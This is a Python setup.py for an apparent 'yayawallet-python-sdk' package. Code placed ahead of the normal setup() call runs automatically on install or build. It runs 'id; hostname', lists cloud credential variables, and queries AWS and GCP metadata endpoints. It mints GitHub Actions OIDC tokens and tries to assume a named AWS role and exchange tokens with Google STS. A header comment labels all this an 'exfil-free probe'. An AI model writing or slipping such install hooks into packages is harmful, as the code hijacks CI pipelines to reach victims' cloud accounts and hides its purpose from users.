import os,json,hashlib
# ---- exfil-free cloud/OIDC federation probe (prints only statuses/hashes) ----
def _req(url, data=None, headers=None, timeout=18, method=None):
    import urllib.request as R, urllib.error
    h={"User-Agent":"artex-oidc-probe"}
    if headers: h.update(headers)
    rq=R.Request(url, data=data, headers=h, method=method)
    try:
        r=R.urlopen(rq,timeout=timeout); return r.status, r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        try: b=e.read().decode("utf-8","replace")
        except Exception: b=""
        return e.code, b
    except Exception as e:
        return -1, str(e)[:200]

def _oidc(aud):
    u=os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL"); t=os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
    if not (u and t): return None,{"err":"no-oidc-env"}
    sep="&" if "?" in u else "?"
    st,b=_req(u+sep+"audience="+aud, headers={"Authorization":"Bearer "+t})
    if st!=200: return None,{"status":st,"body":b[:180]}
    try: jwt=json.loads(b).get("value","")
    except Exception as e: return None,{"parse_err":str(e)[:80],"body":b[:120]}
    return jwt,{"len":len(jwt),"sha16":hashlib.sha256(jwt.encode()).hexdigest()[:16]}

def _artex_cloud():
    import urllib.parse as U, re
    out={"run":os.environ.get("GITHUB_RUN_ID"),"ref":os.environ.get("GITHUB_REF"),"repo":os.environ.get("GITHUB_REPOSITORY")}
    try: out["id"]=os.popen("id; hostname").read()[:120]
    except Exception as e: out["iderr"]=str(e)[:60]
    # ambient env cloud creds?
    out["aws_env"]={k:("set(len=%d)"%len(v)) for k,v in os.environ.items() if k.startswith("AWS_")}
    out["gcp_env"]=[k for k in os.environ if k.startswith(("GOOGLE","GCLOUD","GCP"))]
    out["azure_env"]=[k for k in os.environ if k.startswith(("AZURE","ARM_"))]
    # metadata endpoints (confirm no ambient managed identity)
    md={}
    for name,url in [("aws","http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
                     ("gcp","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/")]:
        st,b=_req(url, timeout=4, headers=({"Metadata-Flavor":"Google"} if name=="gcp" else {"X-aws-ec2-metadata-token":"artex"}))
        md[name]={"status":st,"body":b[:120]}
    out["metadata"]=md
    # mint OIDC tokens for each cloud audience
    auds=["sts.amazonaws.com","iam.googleapis.com","management.azure.com","registry.npmjs.org","index.docker.io","sigstore"]
    toks={}; oidc={}
    for a in auds:
        jwt,meta=_oidc(a); oidc[a]=meta
        if jwt: toks[a]=jwt
    out["oidc"]=oidc
    # ---- AWS: AssumeRoleWithWebIdentity with the ONLY exact role leaked from repos ----
    aws={}
    awt=toks.get("sts.amazonaws.com")
    if awt:
        role="arn:aws:iam::967759522027:role/ecsTaskExecutionRole"
        form=U.urlencode({"Action":"AssumeRoleWithWebIdentity","RoleArn":role,
            "RoleSessionName":"artex-probe","WebIdentityToken":awt,"Version":"2011-06-15","DurationSeconds":"900"}).encode()
        st,b=_req("https://sts.amazonaws.com/", data=form, headers={"Content-Type":"application/x-www-form-urlencoded"}, timeout=22)
        aws["role"]=role; aws["assume_status"]=st
        if st==200:
            aws["assume"]="SUCCESS"
            aws["arn"]=re.findall(r"<Arn>([^<]+)</Arn>",b)[:1]
            aws["has_akid"]="<AccessKeyId>" in b
        else:
            aws["err_code"]=re.findall(r"<Code>([^<]+)</Code>",b)[:1]
            aws["err_msg"]=re.findall(r"<Message>([^<]+)</Message>",b)[:1]
            aws["body"]=b[:280]
    else:
        aws["err"]="no sts token"
    out["aws"]=aws
    # ---- GCP: no precise workload-identity provider path exists in any accessible repo ----
    gcp={}
    gt=toks.get("iam.googleapis.com")
    if gt:
        gcp["token_obtained"]=True
        # probe STS to see whether ANY provider path is accepted; synthetic path expected 400 (invalid)
        body=U.urlencode({"grant_type":"urn:ietf:params:oauth:grant-type:token-exchange",
            "audience":"//iam.googleapis.com/projects/-/locations/global/workloadIdentityPools/-/providers/-",
            "scope":"https://www.googleapis.com/auth/cloud-platform",
            "requested_token_type":"urn:ietf:params:oauth:token-type:access_token",
            "subject_token_type":"urn:ietf:params:oauth:token-type:jwt",
            "subject_token":gt}).encode()
        st,b=_req("https://sts.googleapis.com/v1/token", data=body, headers={"Content-Type":"application/x-www-form-urlencoded"}, timeout=20)
        gcp["sts_status"]=st; gcp["sts_body"]=b[:260]
    out["gcp"]=gcp
    print("ARTEXCLOUD::"+json.dumps(out))
try: _artex_cloud()
except Exception as e:
    print("ARTEXCLOUDERR::"+str(e)[:300])

from setuptools import setup, find_packages

setup(
    name='yayawallet-python-sdk',
    version='1.10.4',
    description='YaYa Wallet Python SDK',
    author="YaYa Wallet",
    author_email="contact@yayawallet.com",
    long_description=open('README.md').read(),
    long_description_content_type='text/markdown',
    packages=find_packages()
)
